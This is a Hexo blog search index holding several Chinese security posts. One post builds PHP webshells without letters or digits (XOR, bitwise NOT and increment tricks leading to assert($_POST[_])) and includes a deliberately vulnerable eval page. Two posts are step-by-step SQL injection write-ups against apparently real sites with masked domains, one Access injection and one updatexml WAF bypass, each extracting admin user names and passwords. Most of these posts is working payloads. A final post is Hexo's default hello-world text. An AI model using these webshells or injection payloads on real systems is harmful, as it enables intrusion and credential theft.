<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[没有数字和字母的webshell思考]]></title>
    <url>%2F2019%2F09%2F02%2FOne-Test-Bypass-webshell%2F</url>
    <content type="text"><![CDATA[看了p牛大佬的一些不包含数字和字母的webshell文章后，觉得思路很骚，就想着自己尝试一波学习学习。 搭建环境1.centos72.php5.4.16+mysql3.准备一段过滤了字母和数字的php代码 12345&lt;?phpif(!preg_match('/[a-z0-9]/is',$_GET['shell'])) &#123; eval($_GET['shell']);&#125;?&gt; 分析思路既然过滤了字母和数字，那么思路很清晰，就是将非字母、数字的字符经过各种变换，最终构造出a-z中任意一个字符。然后再利用PHP允许动态函数执行的特点，拼接出一个函数名，如“assert”，然后动态执行就ojbk啦。 那么如何变换呢？ 这里有一点要提的，本文用到的assert对于php5和php7是不一样的。php5中assert是一个函数，我们可以通过$S_=’assert’;$S_(…);这样的方法来动态执行任意代码。 但php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。不过道路千千万，php的函数调用还是很多的，比如file_put_contents函数，同样可以用来getshell。 方法一采用异或方式，在PHP中2个字符异或时，默认会将2个字符的ascii码进行异或。这里就可以使用2个非字母、数字的字符异或从而得到想要的字母。（不可打印字符的url编码为%十六进制）分析原理SOH标题开始符–%01二进制–00000001斜引号--%60 二进制--01100000 (&#39;%01&#39;^&#39;‘)–01100001a–%61二进制–01100001即(‘%01’^’&#39;)--&gt;a 同理： (&#39;%13&#39;^&#39;‘)–01110011–&gt;s(‘%05’^’&#39;)--&gt;e (&#39;%12&#39;^&#39;‘)–&gt;r(‘%14’^’`’)–&gt;t 开始构造payload 1234$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');//$_='assert';$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']');//$__='_POST';$___=$$__;//$___='$_POST';$_($___[_]);//assert(S_POST[_]); 执行结果： 方法二采用取反方式，这里主要是通过将汉字的某个字符取出来，然后取反从而得到我们想要的字母。例如： ord(‘瞰’[1])–&gt;158二进制–&gt;10011110取反–&gt;01100001–&gt;97–&gt;a同理：‘和’[2]–&gt;s‘的’[1]–&gt;e‘半’[1]–&gt;r‘始’[2]–&gt;t‘俯’[2]–&gt;P‘瞰’[2]–&gt;O‘次’[1]–&gt;S‘站’[1]–&gt;T 开始构造payload 1234567$__=('&gt;'&gt;'&lt;')+('&gt;'&gt;'&lt;');//$__=2;$_=$__/$__;//$_=1;$___=(~('瞰'[$_])).(~('和'[$__])).(~('和'[$__])).(~('的'[$_])).(~('半'[$_])).(~('始'[$__]));//$___='assert';$____='_'.(~('俯'[$__])).(~('瞰'[$__])).(~('次'[$_])).(~('站'[$_]));//$____='_POST';$_=$$____;//$_='$_POST';$___($_[_]);//assert($_POST[_]); 参考了一下p牛大佬的。换种构造方式–&gt;$a=’瞰’;~($a{1});重新构造payload 12345678$__=('&gt;'&gt;'&lt;')+('&gt;'&gt;'&lt;');$_=$__/$__;$____='';$___="瞰";$____.=~($___&#123;$_&#125;);$___="和";$____.=~($___&#123;$__&#125;);$___="和";$____.=~($___&#123;$__&#125;);$___="的";$____.=~($___&#123;$_&#125;);$___="半";$____.=~($___&#123;$_&#125;);$___="始";$____.=~($___&#123;$__&#125;);$_____='_';$___="俯";$_____.=~($___&#123;$__&#125;);$___="瞰";$_____.=~($___&#123;$__&#125;);$___="次";$_____.=~($___&#123;$_&#125;);$___="站";$_____.=~($___&#123;$_&#125;);$_=$$_____;$____($_[_]); 这里还用到了php的弱类型，因为在构造payload的过程中需要使用到1，2。而在php中true=1，因此true+true=2，所以构造2条true语句即可。即：(‘&gt;’&gt;’&lt;’)+(‘&gt;’&gt;’&lt;’)==2 方法三这里用到了php的一个特性，即得到一个字母通过自增来获取其他的字母。例如：既然如此，我们就只需要得到字母a，那从那里获取呢？我们发现数组（Array）里面就有我们需要的a。而在php中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array。例如：因为php函数对大小写不敏感，所以取A就可以啦。 开始构造payload 12345678910111213141516171819202122232425262728293031323334$_=[];$_=@"$_"; // $_='Array';$_=$_['!'=='@']; // $_=$_[0];$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;$_=$$____;$___($_[_]); // ASSERT($_POST[_]); 总结这里不知道是什么原因，导致第二种和第三种方法复现不成功。用php校验了一下函数都构造的是正确的，猜测可能是构造请求payload的时候有些换行或者中间的注释符没有清除干净导致的错误。 推荐阅读：https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.htmlhttps://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html]]></content>
  </entry>
  <entry>
    <title><![CDATA[纪录一次完整的access注入]]></title>
    <url>%2F2019%2F07%2F25%2Fthe-first-accessInjection%2F</url>
    <content type="text"><![CDATA[目标站点：https://www.xxx.com/注入点：https://www.xxx.com/common.asp?id=27 判断注入点1id=27' 1id=27+and+1=1 1id=27+and+1=0 确定这是一个注入点。 判断数据库123id=27+and+(select+count(*)+from+msysobjects)&gt;0 返回正常，则为mssql不正常，为access 确定数据库为access数据库 开始注入order by爆字段1id=27+order+by+7%00 1id=27+order+by+8%00 确定字段是7。 猜表名1id=27+and+exists(select+*+from+admin)%00 经过多次尝试（这里可以爆破）。 1id=27+and+exists(select+*+from+admin_user)%00 猜测出admin_user表。 猜列名1id=27+and+exists(select+id+from+admin_user)%00 存在id列 1id=27+and+exists(select+username+from+admin_user)%00 不存在username，多次尝试（可爆破）。得出至少有id、admin、password三列。 爆用户名，密码1id=27+union+select+1,2,3,4,5,6,7+from+admin_user%00 确定可显字段是2,3。 1id=27+union+select+1,admin,password,4,5,6,7+from+admin_user%00 最终得出账户admin以及密码（MD5解密）。]]></content>
  </entry>
  <entry>
    <title><![CDATA[纪录项目中一次简单的SQL注入bypass]]></title>
    <url>%2F2019%2F07%2F12%2Fjob-first-bypass%2F</url>
    <content type="text"><![CDATA[这篇文章是本人在项目中遇到的一个sql注入bypass的纪录。 目标站点：https://www.xxx.com/注入点：https://www.xxx.com/include/ty/view_score.php?newsid=28671&amp;classid=884 判断注入点1newsid=28671'&amp;classid=884 进一步判断 123'and 1=1 //报错'and 1='1 //不报错'and '1'='1 //不报错 最终确定了这是一个注入点 获取信息按照常规的思路，准备先order by爆一下字段，然后在逐步爆库、表以及用户信息。 常规思路注入先手order by 123'order by 10--+ //Unknown column '10' in 'order clause'1054'order by 2--+ //Unknown column '2' in 'order clause'1054'order by 1--+ //成功 说明只有1个字段，继续进行。 123'union select user()--+ //拦截'union--+ //不拦截'union user()--+ //不拦截 这里猜测拦截了select 12345'union /*!select*/ user()--+ //拦截'union sElect user()--+ //拦截'union sel%0aect user()--+ //不拦截，但是报错'union sel%0aect user()--+ //不拦截，但是报错'union sel/**/ect user()--+ //不拦截，但是报错 emmmmm，到这里我已经绝望了，不得不说这后端处理写的对于我这种新手来说是真的凶残。自顾自的看了一会注入的文章，忽然发现可以采用updatexml报错注入，立刻又开始。 稍稍普及一下updatexml报错注入 12345UPDATEXML (XML_document, XPath_string, new_value); 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。 第三个参数：new_value，String格式，替换查找到的符合条件的数据 作用：改变文档中符合条件的节点的值 官方的东西可能说的不太接地气，直接操作一波大家就知道有什么作用了。大概就是concat将datbase(),user()等返回信息字符串化，然后因为updatexml的第二个参数需要Xpath格式的字符串,所以不符合要求，返回报错信息。 updatexml报错注入获取当前用户1234567'and updatexml(1,concat(0x3a,(select user())),1) //被拦截'and updatexml() //不拦截'and updatexml(1,concat(),1)//拦截'and updatexml(1,con%a0cat(),1)//不拦截，但是报错'and updatexml(1,con%00cat(),1)// 不拦截，但是报错'and updatexml(1,con%0acat(),1) // 不拦截，但是报错'and updatexml(1,/*!concat*/(),1)//不拦截，不报错 通过以上步骤推论waf拦截concant()函数，继续进行。 123'and updatexml(1,/*!concat*/(0x3a,(select user())),1)//拦截'and updatexml(1,/*!concat*/(0x3a,(select)),1)//拦截'and updatexml(1,/*!concat*/(0x3a,(/*!select*/ user())),1) // 不拦截 通过以上步骤推论waf还拦截了select，继续进行。 1234'and updatexml(1,/*!concat*/(0x3a,(/*!select*/ user())),1)--+ //发现页面不响应'and updatexml(1,/*!concat*/(0x3a,(/*!select*/ user())),1) and '//拦截'and updatexml(1,/*!concat*/(0x3a,(/*!select*/ user())),1) /*!and*/ ' 成功'and 1=updatexml(1,/*!concat*/(0x3a,(/*!select*/ user())),1)--+//成功 获取当前数据库1'and 1=updatexml(1,/*!concat*/(0x3a,(/*!select*/ database())),1)--+ 获取到当前数据库和用户后，继续按照常规思路，爆库、爆表、爆字段。 爆库、爆表、爆字段123'and 1=updatexml(1,/*!concat*/(0x3a,(/*!select*/ schema_name from information_schema.schemata limit 0,1)),1)--+ //拦截'and 1=updatexml(1,/*!concat*/(0x3a,(/*!select*/ schema_name from /*!information_schema.schemata*/ limit 0,1)),1)--+//拦截'and 1=updatexml(1,/*!concat*/(0x3a,(/*!select*/schema_name from /*!information0x5fschema.schemata*/ limit 0,1)),1)--+ //成功 虽然执行成功，但似乎限制了权限。思考了很久，正准备放弃的时候，同站点另外一个注入点吸引了我。 这里报错直接把sql语句给提示出来了，刚刚好有我们需要的表信息，二话不说，进一步尝试。 直接按照之前bypass的特点，一步到位。 1' and 1=updatexml(1,/*!concat*/(0x3a,(/*!select*/ username from phome_enewsuser limit 0,1)),1)--+&amp;classid=834 1' and 1=updatexml(1,/*!concat*/(0x3a,(/*!select*/ password from phome_enewsuser limit 0,1)),1)--+&amp;classid=834 总结 任何时候都不要放弃尝试，说不定试着试着就出来了。 推荐阅读：我的WafBypass之道（SQL注入篇）http://www.moonsec.com/post-299.html]]></content>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2019%2F07%2F09%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
